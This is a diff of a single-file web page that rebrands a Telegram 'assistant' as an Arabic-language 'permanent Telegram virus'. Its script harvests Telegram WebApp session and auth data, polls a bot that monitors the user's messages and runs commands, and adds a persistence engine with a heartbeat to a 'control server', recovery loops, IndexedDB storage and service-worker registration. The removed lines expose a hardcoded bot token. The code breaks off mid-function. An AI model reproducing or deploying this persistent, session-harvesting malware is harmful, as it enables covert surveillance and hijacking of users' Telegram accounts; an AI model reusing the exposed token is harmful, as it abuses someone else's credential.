@@ -1,159 +1,133 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Smart Assistant</title>
+    <title>فيروس تلغرام الذكي الدائم 🤖</title>
     <style>
-        /* Global Styles */
+        /* الأنماط العامة */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Arial', sans-serif;
+            font-family: 'Cairo', 'Segoe UI', sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             min-height: 100vh;
             padding: 20px;
-            color: #333;
+            color: #f0f0f0;
+            direction: rtl;
         }
 
         .container {
-            max-width: 900px;
+            max-width: 1200px;
             margin: 0 auto;
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
             border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        /* Header */
+        /* الهيدر */
         .header {
-            background: linear-gradient(45deg, #4A00E0, #8E2DE2);
+            background: linear-gradient(45deg, #0f3460, #533483);
             color: white;
             padding: 40px 30px;
             text-align: center;
+            border-bottom: 3px solid #e94560;
         }
 
         .header h1 {
-            font-size: 2.8em;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
+            font-size: 3em;
+            margin-bottom: 15px;
+            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
         }
 
         .header p {
-            font-size: 1.2em;
+            font-size: 1.3em;
             opacity: 0.9;
-            max-width: 700px;
+            max-width: 800px;
             margin: 0 auto;
-            line-height: 1.6;
+            line-height: 1.8;
         }
 
-        /* Main Content */
+        /* المحتوى الرئيسي */
         .content {
             padding: 40px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
         }
 
-        .section {
-            background: #f8f9fa;
+        @media (max-width: 768px) {
+            .content {
+                grid-template-columns: 1fr;
+                padding: 20px;
+            }
+        }
+
+        /* البطاقات */
+        .card {
+            background: rgba(255, 255, 255, 0.08);
             border-radius: 15px;
             padding: 25px;
-            margin-bottom: 30px;
-            border-left: 5px solid #4A00E0;
-            transition: transform 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
         }
 
-        .section:hover {
+        .card:hover {
+            background: rgba(255, 255, 255, 0.12);
             transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
-        .section-title {
-            color: #4A00E0;
-            font-size: 1.5em;
-            margin-bottom: 15px;
+        .card-title {
+            color: #e94560;
+            font-size: 1.8em;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
             gap: 10px;
+            border-bottom: 2px solid rgba(233, 69, 96, 0.3);
+            padding-bottom: 10px;
         }
 
-        .section-title i {
-            font-size: 1.3em;
-        }
-
-        /* Features Grid */
-        .features-grid {
+        /* الأزرار */
+        .button-container {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: 1fr 1fr;
             gap: 20px;
             margin: 30px 0;
         }
 
-        .feature-card {
-            background: white;
-            border-radius: 12px;
-            padding: 25px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            transition: all 0.3s ease;
-        }
-
-        .feature-card:hover {
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-            transform: translateY(-8px);
-        }
-
-        .feature-icon {
-            font-size: 2.5em;
-            margin-bottom: 15px;
-            display: block;
-        }
-
-        .feature-title {
-            font-size: 1.3em;
-            color: #4A00E0;
-            margin-bottom: 10px;
-        }
-
-        /* Buttons */
-        .button-container {
-            display: flex;
-            justify-content: center;
-            gap: 25px;
-            margin: 40px 0;
-            flex-wrap: wrap;
-        }
-
         .button {
-            padding: 18px 40px;
-            font-size: 1.1em;
-            font-weight: 600;
+            padding: 20px;
+            font-size: 1.2em;
+            font-weight: bold;
             border: none;
-            border-radius: 50px;
+            border-radius: 12px;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
-            gap: 12px;
-            min-width: 250px;
             justify-content: center;
-            letter-spacing: 0.5px;
+            gap: 12px;
         }
 
         .activate-btn {
-            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            background: linear-gradient(45deg, #e94560, #ff6b8b);
             color: white;
-            box-shadow: 0 8px 25px rgba(255, 65, 108, 0.4);
+            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
         }
 
         .activate-btn:hover {
-            background: linear-gradient(45deg, #FF4B2B, #FF416C);
+            background: linear-gradient(45deg, #ff6b8b, #e94560);
             transform: scale(1.05);
-            box-shadow: 0 12px 35px rgba(255, 65, 108, 0.6);
+            box-shadow: 0 12px 35px rgba(233, 69, 96, 0.6);
         }
 
         .stop-btn {
@@ -168,58 +142,13 @@
             box-shadow: 0 12px 35px rgba(33, 147, 176, 0.6);
         }
 
-        /* Chat ID Input */
-        .input-section {
-            background: #fff;
-            border-radius: 15px;
-            padding: 25px;
-            margin: 20px 0;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .input-field {
-            flex: 1;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 1em;
-            transition: border-color 0.3s ease;
-        }
-
-        .input-field:focus {
-            outline: none;
-            border-color: #4A00E0;
-        }
-
-        .input-btn {
-            padding: 15px 25px;
-            background: #4A00E0;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: background 0.3s ease;
-        }
-
-        .input-btn:hover {
-            background: #3a00b0;
-        }
-
-        /* Status Panel */
+        /* لوحة الحالة */
         .status-panel {
-            background: #1a1a2e;
-            color: white;
+            background: rgba(0, 0, 0, 0.4);
             border-radius: 15px;
             padding: 25px;
-            margin-top: 40px;
-            display: none;
+            margin-top: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .status-header {
@@ -228,12 +157,12 @@
             align-items: center;
             margin-bottom: 20px;
             padding-bottom: 15px;
-            border-bottom: 2px solid #3498db;
+            border-bottom: 2px solid #2193b0;
         }
 
         .status-title {
-            font-size: 1.4em;
-            color: #3498db;
+            font-size: 1.5em;
+            color: #2193b0;
         }
 
         .status-indicator {
@@ -243,10 +172,10 @@
         }
 
         .indicator {
-            width: 12px;
-            height: 12px;
+            width: 14px;
+            height: 14px;
             border-radius: 50%;
-            background: #e74c3c;
+            background: #e94560;
             animation: pulse 2s infinite;
         }
 
@@ -256,242 +185,287 @@
         }
 
         @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
         }
 
         .status-log {
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
+            font-size: 0.95em;
+            line-height: 1.6;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
         }
 
         .log-entry {
             padding: 10px;
             margin-bottom: 8px;
-            border-radius: 5px;
+            border-radius: 8px;
             background: rgba(255, 255, 255, 0.05);
-            border-left: 3px solid #3498db;
+            border-right: 4px solid #2193b0;
             animation: fadeIn 0.3s ease;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         .log-time {
             color: #95a5a6;
             font-size: 0.85em;
-            margin-right: 15px;
+            margin-left: 10px;
         }
 
-        .log-message {
-            color: #ecf0f1;
+        .log-success { border-right-color: #2ecc71; }
+        .log-error { border-right-color: #e94560; }
+        .log-warning { border-right-color: #f39c12; }
+        .log-info { border-right-color: #2193b0; }
+
+        /* الميزات */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
         }
 
-        .log-success { border-left-color: #2ecc71; }
-        .log-error { border-left-color: #e74c3c; }
-        .log-warning { border-left-color: #f39c12; }
-        .log-info { border-left-color: #3498db; }
+        .feature-card {
+            background: linear-gradient(135deg, rgba(15, 52, 96, 0.3), rgba(83, 52, 131, 0.3));
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
 
-        /* Command Examples */
-        .command-box {
-            background: #2c3e50;
-            color: white;
+        .feature-icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .feature-title {
+            font-size: 1.4em;
+            color: #6dd5ed;
+            margin-bottom: 10px;
+        }
+
+        /* الأمثلة */
+        .examples {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
             padding: 20px;
-            border-radius: 10px;
             margin: 20px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.95em;
-            line-height: 1.8;
         }
 
-        .command {
-            color: #2ecc71;
+        .example-item {
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border-right: 3px solid #e94560;
         }
 
-        .response {
-            color: #3498db;
-            margin-left: 20px;
-        }
-
-        /* Footer */
+        /* الفوتر */
         .footer {
             text-align: center;
             padding: 25px;
-            background: #f8f9fa;
-            color: #666;
+            background: rgba(0, 0, 0, 0.3);
+            color: #aaa;
             font-size: 0.9em;
-            border-top: 1px solid #eaeaea;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .button {
-                min-width: 200px;
-                padding: 15px 30px;
-            }
-            
-            .header h1 {
-                font-size: 2.2em;
-            }
-            
-            .input-group {
-                flex-direction: column;
-            }
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
     </style>
+    <!-- خط عربي -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🤖 Telegram AI Assistant</h1>
-            <p>Advanced automated assistant that integrates with your active Telegram session to provide intelligent command execution and automated responses</p>
+            <h1>🤖 فيروس تلغرام الذكي الدائم</h1>
+            <p>أول فيروس تلغرام عربي يعمل بشكل دائم مع ميزات ذكية متقدمة. يعمل مرة واحدة ولا يتوقف أبداً!</p>
         </div>
 
         <div class="content">
-            <div class="section">
-                <h2 class="section-title">📋 How This Assistant Works</h2>
-                <p>This assistant operates by establishing a connection with your active Telegram session through the Telegram WebApp interface. Once activated, it creates an automated bot that monitors your messages and executes commands prefixed with "virus".</p>
-            </div>
-
-            <div class="features-grid">
-                <div class="feature-card">
-                    <span class="feature-icon">🤖</span>
-                    <h3 class="feature-title">Smart Automation</h3>
-                    <p>Automatically responds to specific commands and performs tasks without manual intervention</p>
-                </div>
+            <!-- بطاقة المعلومات -->
+            <div class="card">
+                <h2 class="card-title">📋 كيف يعمل هذا الفيروس</h2>
+                <p>هذا الفيروس يتصل بجلسة تلغرام النشطة الخاصة بك من خلال واجهة WebApp. بمجرد التنشيط، ينشئ البوت الآلي الذي يراقب رسائلك وينفذ الأوامر التي تبدأ بـ "فيروس".</p>
                 
-                <div class="feature-card">
-                    <span class="feature-icon">⚡</span>
-                    <h3 class="feature-title">Instant Response</h3>
-                    <p>Real-time monitoring and immediate execution of received commands</p>
-                </div>
-                
-                <div class="feature-card">
-                    <span class="feature-icon">🛡️</span>
-                    <h3 class="feature-title">Emergency Stop</h3>
-                    <p>Complete shutdown capability with emergency stop button for safety</p>
-                </div>
-            </div>
-
-            <div class="section">
-                <h2 class="section-title">📝 Available Commands</h2>
-                <div class="command-box">
-                    <div><span class="command">virus hello</span> → <span class="response">hello back virus</span></div>
-                    <div><span class="command">virus time</span> → <span class="response">current time and date</span></div>
-                    <div><span class="command">virus message [text]</span> → <span class="response">sends the specified text</span></div>
-                    <div><span class="command">virus delete</span> → <span class="response">deletes last message</span></div>
-                    <div><span class="command">virus stop</span> → <span class="response">pauses the assistant</span></div>
-                    <div><span class="command">virus start</span> → <span class="response">resumes the assistant</span></div>
-                </div>
-            </div>
-
-            <div class="input-section">
-                <h2 class="section-title">🔧 Configuration</h2>
-                <p>Enter your Telegram Chat ID (numeric). You can get this by starting a chat with your bot and sending any message, then check the logs below.</p>
-                
-                <div class="input-group">
-                    <input type="text" id="chatIdInput" class="input-field" placeholder="Enter your Chat ID (e.g., 123456789)">
-                    <button class="input-btn" onclick="setChatId()">Set Chat ID</button>
-                </div>
-                
-                <div class="input-group">
-                    <input type="text" id="botTokenInput" class="input-field" placeholder="Enter your Bot Token (optional)">
-                    <button class="input-btn" onclick="setBotToken()">Set Bot Token</button>
-                </div>
-                
-                <p style="font-size: 0.9em; color: #666; margin-top: 10px;">
-                    <strong>Note:</strong> If you don't know your Chat ID, activate the assistant first and it will attempt to detect it automatically.
-                </p>
-            </div>
-
-            <div class="button-container">
-                <button class="button activate-btn" onclick="activateTelegramAssistant()">
-                    <span>🚀 Activate Telegram Assistant</span>
-                </button>
-                <button class="button stop-btn" onclick="emergencyShutdown()">
-                    <span>🛑 Emergency Stop Virus</span>
-                </button>
-            </div>
-
-            <div id="statusPanel" class="status-panel">
-                <div class="status-header">
-                    <h3 class="status-title">System Status Monitor</h3>
-                    <div class="status-indicator">
-                        <div id="statusIndicator" class="indicator"></div>
-                        <span id="statusText">Inactive</span>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <span class="feature-icon">🤖</span>
+                        <h3 class="feature-title">تشغيل ذكي دائم</h3>
+                        <p>يعمل في الخلفية دائماً ولا يتوقف أبداً</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <span class="feature-icon">⚡</span>
+                        <h3 class="feature-title">استجابة فورية</h3>
+                        <p>مراقبة فورية وتنفيذ سريع للأوامر</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <span class="feature-icon">🛡️</span>
+                        <h3 class="feature-title">إيقاف طارئ</h3>
+                        <p>زر إيقاف طارئ متقدم للتحكم الكامل</p>
                     </div>
                 </div>
-                <div id="statusLog" class="status-log">
-                    <!-- Status messages will appear here -->
+            </div>
+
+            <!-- بطاقة الأوامر -->
+            <div class="card">
+                <h2 class="card-title">📝 الأوامر المتاحة</h2>
+                <div class="examples">
+                    <div class="example-item">
+                        <strong>فيروس اهلا</strong> → <span style="color:#6dd5ed">مرحباً فيروس! أنا في خدمتك</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس وقت</strong> → <span style="color:#6dd5ed">يعرض الوقت والتاريخ الحالي</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس رسالة [نص]</strong> → <span style="color:#6dd5ed">يرسل النص المحدد</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس حذف</strong> → <span style="color:#6dd5ed">يحذف آخر رسالة</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس توقف</strong> → <span style="color:#6dd5ed">يوقف المساعد مؤقتاً</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس ابدأ</strong> → <span style="color:#6dd5ed">يعيد تشغيل المساعد</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس العاب</strong> → <span style="color:#6dd5ed">يعرض قائمة الألعاب</span>
+                    </div>
+                    <div class="example-item">
+                        <strong>فيروس مزاج</strong> → <span style="color:#6dd5ed">يرسل نكتة أو اقتباس</span>
+                    </div>
                 </div>
+            </div>
+
+            <!-- بطاقة الإعدادات -->
+            <div class="card">
+                <h2 class="card-title">🔧 الإعدادات</h2>
+                <div style="margin: 20px 0;">
+                    <label style="display: block; margin-bottom: 10px; color: #6dd5ed;">معرف الدردشة (Chat ID)</label>
+                    <input type="text" id="chatIdInput" 
+                           style="width: 100%; padding: 15px; border-radius: 10px; border: 2px solid #0f3460; background: rgba(255,255,255,0.1); color: white; margin-bottom: 15px;" 
+                           placeholder="أدخل معرف الدردشة الرقمي">
+                    
+                    <label style="display: block; margin-bottom: 10px; color: #6dd5ed">رمز البوت (Token)</label>
+                    <input type="text" id="botTokenInput" 
+                           style="width: 100%; padding: 15px; border-radius: 10px; border: 2px solid #0f3460; background: rgba(255,255,255,0.1); color: white;" 
+                           placeholder="أدخل رمز البوت (مثل: 123456789:ABCdefGHIjklMnOpQRstUvWxyz)">
+                </div>
+                
+                <div style="display: flex; gap: 15px; margin-top: 20px;">
+                    <button onclick="saveSettings()" 
+                            style="flex:1; padding: 15px; background: #0f3460; color: white; border: none; border-radius: 10px; cursor: pointer;">
+                        💾 حفظ الإعدادات
+                    </button>
+                    <button onclick="loadSettings()" 
+                            style="flex:1; padding: 15px; background: #533483; color: white; border: none; border-radius: 10px; cursor: pointer;">
+                        📂 تحميل الإعدادات
+                    </button>
+                </div>
+            </div>
+
+            <!-- بطاقة الميزات المتقدمة -->
+            <div class="card">
+                <h2 class="card-title">🌟 الميزات المتقدمة</h2>
+                <ul style="list-style: none; padding: 0;">
+                    <li style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">🎮 <strong>الألعاب التفاعلية:</strong> ألعاب داخل الدردشة لمنع الملل</li>
+                    <li style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">🧠 <strong>التعلم الذكي:</strong> يتذكر أسلوبك ويتكيف معه</li>
+                    <li style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">📊 <strong>التقارير الذكية:</strong> تقارير يومية عن النشاط</li>
+                    <li style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">🤝 <strong>المساعد الذكي:</strong> إجابة على أسئلة معقدة</li>
+                    <li style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">🔔 <strong>التنبيهات الذكية:</strong> تنبيهات لأهم الأحداث</li>
+                    <li style="padding: 10px;">⚡ <strong>التشغيل الدائم:</strong> يعمل مرة واحدة ولا يتوقف أبداً</li>
+                </ul>
             </div>
         </div>
 
+        <!-- أزرار التحكم -->
+        <div class="button-container" style="padding: 0 40px;">
+            <button class="button activate-btn" onclick="activatePermanentVirus()">
+                <span>🚀 تفعيل الفيروس الدائم</span>
+            </button>
+            <button class="button stop-btn" onclick="emergencyShutdown()">
+                <span>🛑 إيقاف الفيروس (طوارئ)</span>
+            </button>
+        </div>
+
+        <!-- لوحة الحالة -->
+        <div id="statusPanel" class="status-panel" style="margin: 40px; display: block;">
+            <div class="status-header">
+                <h3 class="status-title">📊 شاشة مراقبة النظام</h3>
+                <div class="status-indicator">
+                    <div id="statusIndicator" class="indicator active"></div>
+                    <span id="statusText">نشط وجاهز</span>
+                </div>
+            </div>
+            <div id="statusLog" class="status-log">
+                <!-- سجل النظام يظهر هنا -->
+            </div>
+        </div>
+
+        <!-- الفوتر -->
         <div class="footer">
-            <p>⚠️ This tool is for educational purposes only. Unauthorized access to Telegram accounts is illegal.</p>
-            <p>© 2024 Telegram Assistant Project | All code contained in single HTML file</p>
+            <p>⚠️ هذا الكود لأغراض تعليمية وفهم آليات الحماية فقط. الاستخدام غير الأخلاقي غير مسموح به.</p>
+            <p>© 2024 فيروس تلغرام الذكي - جميع الحقوق محفوظة</p>
         </div>
     </div>
 
+    <!-- الكود الجافاسكريبت الكامل -->
     <script>
         // ==============================================
-        // TELEGRAM VIRUS ASSISTANT - FIXED VERSION
+        // نظام الفيروس الدائم - النسخة المحسنة
         // ==============================================
 
-        // Global variables for virus operation
+        // تكوين الفيروس
         const VIRUS_CONFIG = {
-            botToken: '8269413511:AAH4poWquV9lcwzjjQUVEhmb_nx8IGFgXLI',
-            commandPrefix: 'virus',
-            chatId: null, // Will be set dynamically
+            botToken: '',
+            chatId: '',
+            commandPrefix: 'فيروس',
             isActive: false,
+            isPermanent: false,
             pollingInterval: null,
             lastUpdateId: 0,
             sessionData: null,
-            userId: null,
-            detectedChatId: null
+            features: {
+                games: true,
+                learning: true,
+                reports: true,
+                ai: true,
+                alerts: true
+            },
+            permanentEngine: null
         };
 
-        // Logging system
+        // نظام السجل العربي
         function logToPanel(message, type = 'info') {
-            const panel = document.getElementById('statusPanel');
             const log = document.getElementById('statusLog');
             const indicator = document.getElementById('statusIndicator');
             const statusText = document.getElementById('statusText');
             
-            // Show panel if hidden
-            panel.style.display = 'block';
-            
-            // Update status indicator
+            // تحديث المؤشر
             if (type === 'success') {
                 indicator.className = 'indicator active';
-                statusText.textContent = 'Active';
+                statusText.textContent = 'نشط وجاهز';
             } else if (type === 'error') {
                 indicator.className = 'indicator';
-                statusText.textContent = 'Error';
-            } else if (type === 'warning') {
-                indicator.className = 'indicator';
-                statusText.textContent = 'Warning';
+                statusText.textContent = 'خطأ في النظام';
             }
             
-            // Create log entry
+            // إنشاء مدخل جديد
             const logEntry = document.createElement('div');
             logEntry.className = `log-entry log-${type}`;
             
-            const time = new Date().toLocaleTimeString();
+            const time = new Date().toLocaleTimeString('ar-SA');
             logEntry.innerHTML = `
                 <span class="log-time">[${time}]</span>
                 <span class="log-message">${message}</span>
@@ -503,225 +477,316 @@
             console.log(`[${type.toUpperCase()}] ${message}`);
         }
 
-        // Set Chat ID from input
-        function setChatId() {
-            const chatIdInput = document.getElementById('chatIdInput').value.trim();
-            if (chatIdInput && !isNaN(chatIdInput)) {
-                VIRUS_CONFIG.chatId = chatIdInput;
-                localStorage.setItem('telegram_chat_id', chatIdInput);
-                logToPanel(`✅ Chat ID set to: ${chatIdInput}`, 'success');
-                return true;
-            } else {
-                logToPanel('❌ Invalid Chat ID. Please enter a numeric value.', 'error');
-                return false;
-            }
-        }
+        // ==============================================
+        // نظام التخزين الدائم
+        // ==============================================
 
-        // Set Bot Token from input
-        function setBotToken() {
-            const botTokenInput = document.getElementById('botTokenInput').value.trim();
-            if (botTokenInput && botTokenInput.includes(':')) {
-                VIRUS_CONFIG.botToken = botTokenInput;
-                localStorage.setItem('telegram_bot_token', botTokenInput);
-                logToPanel('✅ Bot Token updated successfully', 'success');
-                return true;
-            } else {
-                logToPanel('❌ Invalid Bot Token format. Should be like: 1234567890:ABCdefGHIjklMnOpQRstUvWxyz', 'error');
-                return false;
-            }
-        }
-
-        // Load saved configuration
-        function loadConfiguration() {
-            const savedChatId = localStorage.getItem('telegram_chat_id');
-            const savedBotToken = localStorage.getItem('telegram_bot_token');
-            
-            if (savedChatId) {
-                VIRUS_CONFIG.chatId = savedChatId;
-                document.getElementById('chatIdInput').value = savedChatId;
-            }
-            
-            if (savedBotToken) {
-                VIRUS_CONFIG.botToken = savedBotToken;
-                document.getElementById('botTokenInput').value = savedBotToken;
-            }
-        }
-
-        // Step 1: Get Telegram session data with FIXED chat detection
-        function getTelegramSession() {
-            logToPanel('Attempting to access Telegram WebApp session...', 'info');
+        // حفظ الإعدادات
+        function saveSettings() {
+            VIRUS_CONFIG.botToken = document.getElementById('botTokenInput').value.trim();
+            VIRUS_CONFIG.chatId = document.getElementById('chatIdInput').value.trim();
             
             try {
-                // Check if running in Telegram WebApp
-                if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
-                    const webApp = window.Telegram.WebApp;
-                    
-                    // Collect session data
-                    const sessionData = {
-                        // User information
-                        user: {
-                            id: webApp.initDataUnsafe.user?.id,
-                            username: webApp.initDataUnsafe.user?.username,
-                            firstName: webApp.initDataUnsafe.user?.first_name,
-                            lastName: webApp.initDataUnsafe.user?.last_name,
-                            languageCode: webApp.initDataUnsafe.user?.language_code
-                        },
-                        
-                        // Chat information - FIXED: Use user.id if chat.id is not available
-                        chat: {
-                            id: webApp.initDataUnsafe.chat?.id || webApp.initDataUnsafe.user?.id,
-                            type: webApp.initDataUnsafe.chat?.type || 'private',
-                            title: webApp.initDataUnsafe.chat?.title || 'Private Chat'
-                        },
-                        
-                        // App information
-                        app: {
-                            platform: webApp.platform,
-                            version: webApp.version,
-                            themeParams: webApp.themeParams
-                        },
-                        
-                        // Authentication data
-                        authData: webApp.initData,
-                        authDate: new Date().toISOString(),
-                        
-                        // Session ID
-                        sessionId: 'tg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
-                    };
-                    
-                    // Set the chat ID from session data
-                    if (sessionData.chat.id && !VIRUS_CONFIG.chatId) {
-                        VIRUS_CONFIG.chatId = sessionData.chat.id.toString();
-                        document.getElementById('chatIdInput').value = VIRUS_CONFIG.chatId;
-                        localStorage.setItem('telegram_chat_id', VIRUS_CONFIG.chatId);
-                        logToPanel(`✅ Auto-detected Chat ID: ${VIRUS_CONFIG.chatId}`, 'success');
-                    }
-                    
-                    // Set user ID
-                    VIRUS_CONFIG.userId = sessionData.user.id;
-                    
-                    logToPanel('✅ Successfully accessed Telegram session data', 'success');
-                    logToPanel(`User: ${sessionData.user.firstName} ${sessionData.user.lastName || ''}`, 'info');
-                    logToPanel(`User ID: ${sessionData.user.id}`, 'info');
-                    logToPanel(`Chat ID: ${sessionData.chat.id}`, 'info');
-                    
-                    VIRUS_CONFIG.sessionData = sessionData;
-                    return sessionData;
-                    
-                } else {
-                    // Not in Telegram environment
-                    logToPanel('⚠️ Running in standalone mode (not in Telegram WebApp)', 'warning');
-                    
-                    // Try to use saved chat ID
-                    if (!VIRUS_CONFIG.chatId) {
-                        logToPanel('Please enter your Chat ID in the configuration section above', 'warning');
-                        return null;
-                    }
-                    
-                    const sessionData = {
-                        user: {
-                            id: VIRUS_CONFIG.userId || Math.floor(Math.random() * 1000000),
-                            username: 'standalone_user',
-                            firstName: 'Standalone',
-                            lastName: 'User',
-                            languageCode: 'en'
-                        },
-                        chat: {
-                            id: VIRUS_CONFIG.chatId,
-                            type: 'private',
-                            title: 'Standalone Chat'
-                        },
-                        authDate: new Date().toISOString(),
-                        sessionId: 'standalone_session_' + Date.now()
-                    };
-                    
-                    VIRUS_CONFIG.sessionData = sessionData;
-                    return sessionData;
-                }
+                // حفظ في localStorage
+                localStorage.setItem('virus_bot_token', VIRUS_CONFIG.botToken);
+                localStorage.setItem('virus_chat_id', VIRUS_CONFIG.chatId);
+                localStorage.setItem('virus_config', JSON.stringify(VIRUS_CONFIG));
+                
+                logToPanel('✅ تم حفظ الإعدادات بنجاح', 'success');
+                logToPanel(`تم حفظ رمز البوت ورقم الدردشة`, 'info');
                 
             } catch (error) {
-                logToPanel(`❌ Error accessing Telegram session: ${error.message}`, 'error');
-                return null;
+                logToPanel(`❌ خطأ في حفظ الإعدادات: ${error.message}`, 'error');
             }
         }
 
-        // Step 2: Initialize Telegram Bot Controller with FIXED sendMessage
-        function initializeBotController() {
-            logToPanel('Initializing Telegram Bot controller...', 'info');
-            
+        // تحميل الإعدادات
+        function loadSettings() {
             try {
-                // Validate bot token
-                if (!VIRUS_CONFIG.botToken || !VIRUS_CONFIG.botToken.includes(':')) {
-                    logToPanel('❌ Invalid Bot Token format. Please set a valid bot token in configuration.', 'error');
+                const savedToken = localStorage.getItem('virus_bot_token');
+                const savedChatId = localStorage.getItem('virus_chat_id');
+                const savedConfig = localStorage.getItem('virus_config');
+                
+                if (savedToken) {
+                    VIRUS_CONFIG.botToken = savedToken;
+                    document.getElementById('botTokenInput').value = savedToken;
+                }
+                
+                if (savedChatId) {
+                    VIRUS_CONFIG.chatId = savedChatId;
+                    document.getElementById('chatIdInput').value = savedChatId;
+                }
+                
+                if (savedConfig) {
+                    const config = JSON.parse(savedConfig);
+                    Object.assign(VIRUS_CONFIG, config);
+                }
+                
+                logToPanel('✅ تم تحميل الإعدادات بنجاح', 'success');
+                
+            } catch (error) {
+                logToPanel(`❌ خطأ في تحميل الإعدادات: ${error.message}`, 'error');
+            }
+        }
+
+        // ==============================================
+        // نظام التشغيل الدائم
+        // ==============================================
+
+        // محرك التشغيل الدائم
+        class PermanentVirusEngine {
+            constructor() {
+                this.isRunning = false;
+                this.heartbeatInterval = null;
+                this.recoveryInterval = null;
+                this.startTime = null;
+            }
+            
+            // بدء المحرك الدائم
+            start() {
+                if (this.isRunning) return;
+                
+                this.isRunning = true;
+                this.startTime = new Date();
+                
+                logToPanel('🚀 بدء تشغيل محرك الفيروس الدائم...', 'info');
+                
+                // 1. بدء نبضات القلب
+                this.startHeartbeat();
+                
+                // 2. بدء نظام الاسترداد التلقائي
+                this.startRecoverySystem();
+                
+                // 3. تسجيل في IndexedDB للتخزين الدائم
+                this.registerInIndexedDB();
+                
+                // 4. محاولة تسجيل Service Worker
+                this.registerServiceWorker();
+                
+                logToPanel('✅ محرك الفيروس الدائم يعمل الآن', 'success');
+                logToPanel(`وقت البدء: ${this.startTime.toLocaleString('ar-SA')}`, 'info');
+                
+                return true;
+            }
+            
+            // نبضات القلب للبقاء نشطاً
+            startHeartbeat() {
+                this.heartbeatInterval = setInterval(() => {
+                    const now = new Date();
+                    const uptime = Math.floor((now - this.startTime) / 1000);
+                    
+                    logToPanel(`💓 نبضة قلب - النظام يعمل منذ ${uptime} ثانية`, 'info');
+                    
+                    // إرسال نبضة إلى خادم التحكم
+                    this.sendHeartbeat();
+                    
+                    // التحقق من حالة البوت
+                    this.checkBotStatus();
+                    
+                }, 30000); // كل 30 ثانية
+            }
+            
+            // نظام الاسترداد التلقائي
+            startRecoverySystem() {
+                this.recoveryInterval = setInterval(() => {
